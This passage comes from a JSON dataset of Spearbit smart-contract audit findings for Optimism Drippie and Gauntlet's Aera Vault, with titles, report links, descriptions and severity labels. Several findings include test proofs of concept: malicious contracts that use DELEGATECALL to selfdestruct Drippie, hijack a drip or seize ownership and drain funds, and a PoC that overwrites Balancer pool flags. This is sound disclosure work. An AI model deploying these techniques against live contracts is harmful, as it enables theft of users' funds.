            "Severity: Low Risk"
        ]
    },
    {
        "title": "AssetReceiver Allows Burning ETH, ERC20 and ERC721 Tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "AssetReceiver contains functions that allow the owner of the contract to withdraw ETH, ERC20 and ERC721 tokens. Those functions allow specifying the receiver address of ETH, ERC20 and ERC721 tokens but they do not check that the receiver address is not address(0). By not doing so, those functions allow to:  Burn ETH if sent to address(0).  Burn ERC20 tokens if sent to address(0) and the ERC20 _asset allow tokens to be burned via transfer (For example, Solmates ERC20 allow that, OpenZeppelin instead will revert if the recipient is address(0)).  Burn ERC721 tokens if sent to address(0) and the ERC721 _asset allow tokens to be burned via trans- ferFrom (For example, both Solmate and OpenZeppelin implementations prevent to send the _id to the address(0) but you dont know if that is still true about custom ERC721 contract that does not use those libraries).",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AssetReceiver Not Implementing onERC721Received Callback Required by safeTransferFrom.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "AssetReceiver contains the function withdrawERC721 that allow the owner to withdraw ERC721 tokens. As stated in the EIP-721, the safeTransferFrom (used by the sender to transfer ERC721 tokens to the AssetRe- ceiver) will revert if the target contract (AssetReceiver in this case) is not implementing onERC721Received and returning the expected value bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\")).",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Both Transactor.CALL and Transactor.DELEGATECALL Do Not Emit Events",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Transactor contains a \"general purpose\" DELEGATECALL and CALL function that allow the owner to execute a delegatecall and call toward a target address passing an arbitrary payload. Both of those functions are executing delegatecall and call without emitting any events. Because of the general- purpose nature of these function, it would be considered a good security measure to emit events to track the functions usage. Those events could be then used to monitor and track usage by external monitoring services.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Both Transactor.CALL and Transactor.DELEGATECALL Do Not Check the Result of the Execution",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The Transactor contract contains a \"general purpose\" DELEGATECALL and CALL function that allow the owner to execute a delegatecall and call toward a target address passing an arbitrary payload. Both functions return the delegatecall and call result back to the caller without checking whether execution was successful or not. By not implementing such check, the transaction could fail silently. Another side effect is that the ETH sent along with the execution (both functions are payable) would remain in the Drippie contract and not transferred to the _target. Test example showcasing the issue: contract Useless { // A contract that have no functions // No fallback functions // Will not accept ETH (only from selfdestruct/coinbase) } function test_transactorCALL() public { Useless useless = new Useless(); bool success; vm.deal(deployer, 3 ether); vm.deal(address(drippie), 0 ether); vm.deal(address(useless), 0 ether); vm.prank(deployer); // send 1 ether via `call` to a contract that cannot receive them 8 (success, ) = drippie.CALL{value: 1 ether}(address(useless), \"\", 100000, 1 ether); assertEq(success, false); vm.prank(deployer); // Perform a `call` to a not existing target's function (success, ) = drippie.CALL{value: 1 ether}(address(useless), abi.encodeWithSignature(\"notExistingFn()\"), 100000, 1 ether); assertEq(success, false); assertEq(deployer.balance, 1 ether); assertEq(address(drippie).balance, 2 ether); assertEq(address(useless).balance, 0); ,! } function test_transactorDELEGATECALL() public { Useless useless = new Useless(); bool success; vm.deal(deployer, 3 ether); vm.deal(address(drippie), 0 ether); vm.deal(address(useless), 0 ether); vm.prank(deployer); // send 1 ether via `delegatecall` to a contract that cannot receive them (success, ) = drippie.DELEGATECALL{value: 1 ether}(address(useless), \"\", 100000); assertEq(success, false); vm.prank(deployer); // Perform a `delegatecall` to a not existing target's function (success, ) = drippie.DELEGATECALL{value: 1 ether}(address(useless), abi.encodeWithSignature(\"notExistingFn()\"), 100000); assertEq(success, false); assertEq(deployer.balance, 1 ether); assertEq(address(drippie).balance, 2 ether); assertEq(address(useless).balance, 0); ,! }",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Transactor.DELEGATECALL Data Overwrite and selfdestruct Risks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The Transactor contract contains a \"general purpose\" DELEGATECALL function that allow the owner to execute a delegatecall toward a target address passing an arbitrary payload. Consider the following scenarios:  Scenario 1 A malicious target contract could selfdestruct the Transactor contract and as a consequence the contract that is inheriting from Transactor. Test example showcasing the issue: 9 contract SelfDestroyer { function destroy(address receiver) external { selfdestruct(payable(receiver)); } } function test_canOwnerSelftDestructDrippie() public { // Assert that Drippie exist assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.PAUSED); assertGt(getContractSize(address(drippie)), 0); // set it to active vm.prank(deployer); drippie.status(DEFAULT_DRIP_NAME, Drippie.DripStatus.ACTIVE); assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.ACTIVE); // fund the drippie with 1 ETH vm.deal(address(drippie), 1 ether); uint256 deployerBalanceBefore = deployer.balance; uint256 drippieBalanceBefore = address(drippie).balance; // deploy the destroyer SelfDestroyer selfDestroyer = new SelfDestroyer(); vm.prank(deployer); drippie.DELEGATECALL(address(selfDestroyer), abi.encodeWithSignature(\"destroy(address)\", deployer), gasleft()); ,! uint256 deployerBalanceAfter = deployer.balance; uint256 drippieBalanceAfter = address(drippie).balance; // assert that the deployer has received the balance that was present in Drippie assertEq(deployerBalanceAfter, deployerBalanceBefore + drippieBalanceBefore); assertEq(drippieBalanceAfter, 0); // Weird things happens with forge // Because we are in the same block the code of the contract is still > 0 so // Cannot use assertEq(getContractSize(address(drippie)), 0); // Known forge issue // 1) Forge resets storage var to 0 after self-destruct (before tx ends) 2654 -> https://github.com/foundry-rs/foundry/issues/2654 // 2) selfdestruct has no effect in test 1543 -> https://github.com/foundry-rs/foundry/issues/1543 assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.PAUSED); ,! }  Scenario 2 The delegatecall allows the owner to intentionally, or accidentally, overwrite the content of the drips mapping. By being able to modify the drips mapping, a malicious user would be able to execute a series of actions like: Changing drips status:  Activating an archived drip  Deleting a drip by changing the status to NONE (this allows the owner to override entirely the drip by calling again create)  Switching an active/paused drip to paused/active 10  etc.. Change drips interval:  Prevent a drip from being executed any more by setting interval to a very high value  Allow a drip to be executed more frequently by lowering the interval value  Enable reentrancy by setting interval to 0 Change drips actions:  Override an action to send drips contract balance to an arbitrary address  etc.. Test example showcasing the issue: contract ChangeDrip { address public owner; mapping(string => Drippie.DripState) public drips; function someInnocentFunction() external { drips[\"FUND_BRIDGE_WALLET\"].config.actions[0] = Drippie.DripAction({ target: payable(address(1024)), data: new bytes(0), value: 1 ether }); } } 11 function test_canDELEGATECALLAllowReplaceAction() public { vm.deal(address(drippie), 10 ether); vm.deal(address(attacker), 0 ether); // Create an action with name \"FUND_BRIDGE_WALLET\" that have the function // To fund a wallet vm.startPrank(deployer); string memory fundBridgeWalletName = \"FUND_BRIDGE_WALLET\"; Drippie.DripAction[] memory actions = new Drippie.DripAction[](1); // The first action will send Bob 1 ether actions[0] = Drippie.DripAction({ target: payable(address(alice)), data: new bytes(0), value: 1 ether ,! }); Drippie.DripConfig memory config = createConfig(100, IDripCheck(address(checkTrue)), new bytes(0), actions); drippie.create(fundBridgeWalletName, config); drippie.status(fundBridgeWalletName, Drippie.DripStatus.ACTIVE); vm.stopPrank(); // Deploy the malicius contract vm.prank(attacker); ChangeDrip changeDripContract = new ChangeDrip(); // make the owner of drippie call via DELEGATECALL an innocentfunction of the exploiter contract vm.prank(deployer); drippie.DELEGATECALL(address(changeDripContract), abi.encodeWithSignature(\"someInnocentFunction()\"), 1000000); ,! // Now the drip action should have changed, anyone can execute it and funds would be sent to // the attacker and not to the bridge wallet drippie.drip(fundBridgeWalletName); // Assert we have drained Drippie assertEq(attacker.balance, 1 ether); assertEq(address(drippie).balance, 9 ether); }  Scenario 3 Calling a malicious contract or accidentally calling a contract which does not account for Drippies storage layout can result in owner being overwritten. Test example showcasing the issue: contract GainOwnership { address public owner; function someInnocentFunction() external { owner = address(1024); } } 12 function test_canDELEGATECALLAllowOwnerLoseOwnership() public { vm.deal(address(drippie), 10 ether); vm.deal(address(attacker), 0 ether); // Deploy the malicius contract vm.prank(attacker); GainOwnership gainOwnershipContract = new GainOwnership(); // make the owner of drippie call via DELEGATECALL an innocentfunction of the exploiter contract vm.prank(deployer); drippie.DELEGATECALL(address(gainOwnershipContract), abi.encodeWithSignature(\"someInnocentFunction()\"), 1000000); ,! // Assert that the attacker has gained onwership assertEq(drippie.owner(), attacker); // Steal all the funds vm.prank(attacker); drippie.withdrawETH(payable(attacker)); // Assert we have drained Drippie assertEq(attacker.balance, 10 ether); assertEq(address(drippie).balance, 0 ether); }",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use calldata over memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Some gas savings if function arguments are passed as calldata instead of memory.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid String names in Events and Mapping Key",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Drip events emit an indexed nameref and the name as a string. These strings must be passed into every drip call adding to gas costs for larger strings.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid Extra sloads on Drippie.status",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Information for emitting event can be taken from calldata instead of reading from storage. Can skip repeat drips[_name].status reads from storage.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use Custom Errors Instead of Strings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "To save some gas the use of custom errors leads to cheaper deploy time cost and run time cost. The run time cost is only relevant when the revert condition is met.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Increment In The For Loop Post Condition In An Unchecked Block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "This is only relevant if you are using the default solidity checked arithmetic. i++ involves checked arithmetic, which is not required. This is because the value of i is always strictly less than length <= 2**256 - 1. Therefore, the theoretical maximum value of i to enter the for-loop body is 2**256 - 2. This means that the i++ in the for loop can never overflow. Regardless, the overflow checks are performed by the compiler. Unfortunately, the Solidity optimizer is not smart enough to detect this and remove the checks. One can manually do this by: for (uint i = 0; i < length; ) { // do something that doesn't change the value of i unchecked { ++i; } }",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "DripState.count Location and Use",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "DripState.count is recorded and never used within the Drippie or IDripCheck contracts. DripState.count is also incremented after all external calls, inconsistent with Checks, Effects, Interactions con- vention.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Type Checking Foregone on DripCheck",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Passing params as bytes makes for a flexible DripCheck, however, type checking is lost.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Confirm Blind ERC721 Transfers are Intended",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "AssetReceiver uses transferFrom instead of safeTransferFrom. The callback on safeTransferFrom often poses a reentrancy risk but in this case the function is restricted to onlyOwner.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code Contains Empty Blocks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Its best practice that when there is an empty block, to add a comment in the block explaining why its empty. While not technically errors, they can cause confusion when reading code.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code Structure Deviates From Best-Practice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The best-practice layout for a contract should follow this order:  State variables.  Events.  Modifiers.  Constructor.  Functions. Function ordering helps readers identify which functions they can call and find constructor and fallback functions easier. Functions should be grouped according to their visibility and ordered as: constructor, receive function (if ex- ists), fallback function (if exists), external, public, internal, private. Some constructs deviate from this recommended best-practice: structs and mappings after events.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing or Incomplete NatSpec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Checking Boolean Against Boolean",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "executable returns a boolean in which case the comparison to true is unnecessary. executable also reverts if any precondition check fails in which case false will never be returned.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Drippie.executable Never Returns false Only true or Reverts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "executable(string memory _name) public view returns (bool). The executable implemented in the Drippie contract has the following signature From the signature and the natspec documentation @return True if the drip is executable, false other- wise. Without reading the code, a user/developer would expect that the function returns true if all the checks passes otherwise false but in reality the function will always return true or revert. Because of this behavior, a reverting drip that do not pass the requirements inside executable will never revert with the message present in the following code executed by the drip function require( executable(_name) == true, \"Drippie: drip cannot be executed at this time, try again later\" );",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Drippie Use Case Notes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Drippie intends to support use cases outside of the initial hot EOA top-up use case demonstrated by Optimism. To further clarify, weve noted that drips support:  Sending eth  External function calls with fixed params  Preconditions Examples include, conditionally transferring eth or tokens. Calling an admin function iff preconditions are met. Drips do not support:  Updating the drip contract storage  Altering params  Postconditions Examples include, vesting contracts or executing Uniswap swaps based on recent moving averages (which are not without their own risks). Where dynamic params or internal accounting is needed, a separate contract needs to be paired with the drip.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Augment Documentation for dripcheck.check Indicating Precondition Check Only Performed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Before executing the whole batch of actions the drip function call executable that check if the drip can be executed. Inside executable an external contract is called by this instruction require( state.config.dripcheck.check(state.config.checkparams), \"Drippie: dripcheck failed so drip is not yet ready to be triggered\" ); Optimism provided some examples like checking if a target balance is below a specific threshold or above that threshold, but in general, the dripcheck.check invocation could perform any kind of checks. The important part that should be clear in the natspec documentation of the drip function is that that specific check is performed only once before the execution of the bulk of actions.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Considerations on the drip state.last and state.config.interval values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "When the drip function is called by an external actor, the executable is executed to check if the drip meets all the needed requirements to be executed. The only check that is done regarding the drip state.last and state.config.interval is this require( state.last + state.config.interval <= block.timestamp, \"Drippie: drip interval has not elapsed since last drip\" ); The state.time is never really initialized when the create function is called, this means that it will be automatically initialized with the default value of the uint256 type: 0.  Consideration 1: Drips could be executed as soon as created Depending on the value set to state.config.interval the executables logic implies that as soon as a drip is created, the drip can be immediately (even in the same transaction) executed via the drip function.  Consideration 2: A very high value for interval could make the drip never executable block.timestamp represents the number of seconds that passed since Unix Time (1970-01-01T00:00:00Z). When the owner of the Drippie want to create a \"one shot\" drip that can be executed immediately after creation but only once (even if the owner forgets to set the drips status to ARCHIVED) he/she should be aware that the max value that he/she can use for the interval is at max block.timestamp. This mean that the second time the drip can be executed is after block.timestamp seconds have been passed. If, for example, the owner create right now a drip with interval = block.timestamp it means that after the first execution the same drip could be executed after ~52 years (~2022-1970).",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Support ERC1155 in AssetReceiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "AssetReceiver support ERC20 and ERC721 interfaces but not ERC1155.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reorder DripStatus Enum for Clarity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The current implementation of Drippie contract has the following enum type: enum DripStatus { NONE, // uint8(0) ACTIVE, PAUSED, ARCHIVED } When a drip is created via the create function, its status is initialized to PAUSED (equal to uint8(2)) and when it gets activated its status is changed to ACTIVE (equal to uint8(1)) So, the status change from 0 (NONE) to 2 (PAUSED) to 1 (ACTIVE). Switching the order inside the enum DripStatus definition between PAUSED and ACTIVE would make it more clean and easier to understand.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "_gas is Unneeded as Transactor.CALL and Transactor.DELEGATECALL Function Argument",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "The caller (i.e. contract owner) can control desired amount of gas at the transaction level.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Licensing Conflict on Inherited Dependencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Solmate contracts are AGPL Licensed which is incompatible with the MIT License of Drippie related contracts.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename Functions for Clarity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "status The status(string memory _name, DripStatus _status) function allows the owner to update the status of a drip. The purpose of the function, based on the name, is not obvious at first sight and could confuse a user into believing that its a view function to retrieve the status of a drip instead of mutating its status. executable The executable(string memory _name) public view returns (bool) function returns true if the drip with name _name can be executed.",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Owner Has Permission to Drain Value from Drippie Contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenarios.  Scenario 1 Owner may create arbitrary drips, including a drip to send all funds to themselves.  Scenario 2 AssetReceiver permits owner to withdraw ETH, ERC20 tokens, and ERC721 tokens.  Scenario 3 Owner may execute arbitrary calls. Transactor.CALL function is a function that allows the owner of the contract to execute a \"general purpose\" low- level call. function CALL( address _target, bytes memory _data, uint256 _gas, uint256 _value ) external payable onlyOwner returns (bool, bytes memory) { return _target.call{ gas: _gas, value: _value }(_data); } The function will transfer _value ETH present in the contract balance to the _target address. The function is also payable and this mean that the owner can send along with the call some funds. Test example showcasing the issue: 23 function test_transactorCALLAllowOwnerToDrainDrippieContract() public { bool success; vm.deal(deployer, 0 ether); vm.deal(bob, 0 ether); vm.deal(address(drippie), 1 ether); vm.prank(deployer); // send 1 ether via `call` to a contract that cannot receive them (success, ) = drippie.CALL{value: 0 ether}(bob, \"\", 100000, 1 ether); assertEq(success, true); assertEq(address(drippie).balance, 0 ether); assertEq(bob.balance, 1 ether); }",
        "labels": [
            "Spearbit",
            "OptimismDrippie",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important Balancer fields can be overwritten by EndTime",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit | | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] 1 bit // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 32 bits | 64 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "sweep function should prevent Treasury from withdrawing pools BPTs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "The current sweep() implementation allows the vault owner (the Treasury) to sweep any token owned by the vault including BPTs (Balancer Pool Tokens) that have been minted by the Vault during the pools initialDeposit() function call. The current vault implementation does not need those BPTs to withdraw funds because they are passed directly through the AssetManager flow via withdraw()/finalize(). Being able to withdraw BPTs would allow the Treasury to:  Withdraw funds without respecting the time period between initiateFinalization() and finalize() calls.  Withdraw funds without respecting Validator allowance() limits.  Withdraw funds without paying the managers fee for the last withdraw().  finalize the pool, withdrawing all funds and selling valueless BPTs on the market.  Sell or rent out BPTs and withdraw() funds afterwards, thus doubling the funds. Swap fees would not be paid because Treasury could call setManager(newManager), where the new manager is someone controlled by the Treasury, subsequently calling setSwapFee(0) to remove the swap fee, which would be applied during an exitPool() event. Note: Once the BPT is retrieved it can also be used to call exitPool(), as the mustAllowlistLPs check is ignored in exitPool().",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Manager can cause an immediate weight change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. When endTime is set to 2**32 it becomes larger than startTime so the _require(startTime <= endTime, ...) statement will not revert. When endTime is converted to 32 bits it will get a value of 0, so in _calcu- lateWeightChangeProgress() the test if (currentTime >= endTime) ... will be true, causing the weight to immediately reach the end value. This way the Manager can cause an immediate weight change via the updateWeightsGradually() function and open arbitrage opportunities. Note: startTime is also subject to this overflow problem. Note: the same issues occur in the latest version of ManagedPool. Note: This issue has been reported to Balancer by the Spearbit team. 7 Also see the following issues:  Managed Pools are still undergoing development and may contain bugs and/or change significantly  Important fields of Balancer can be overwritten by EndTime contract ManagedPool is BaseWeightedPool, ReentrancyGuard { function updateWeightsGradually(uint256 startTime, uint256 endTime, ... ) { ... uint256 currentTime = block.timestamp; startTime = Math.max(currentTime, startTime); _require(startTime <= endTime, Errors.GRADUAL_UPDATE_TIME_TRAVEL); // will not revert if ,! endTime == 2**32 ... _startGradualWeightChange(startTime, endTime, _getNormalizedWeights(), endWeights, tokens); } function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } function _calculateWeightChangeProgress() private view returns (uint256) { uint256 currentTime = block.timestamp; bytes32 poolState = _getMiscData(); uint256 startTime = poolState.decodeUint32(_START_TIME_OFFSET); uint256 endTime = poolState.decodeUint32(_END_TIME_OFFSET); if (currentTime >= endTime) { // will be true if endTime == (2**32) capped to 32 bits == 0 return FixedPoint.ONE; } else ... ... } }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: High Risk"
        ]
    },
    {
        "title": "deposit and withdraw functions are susceptible to sandwich attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
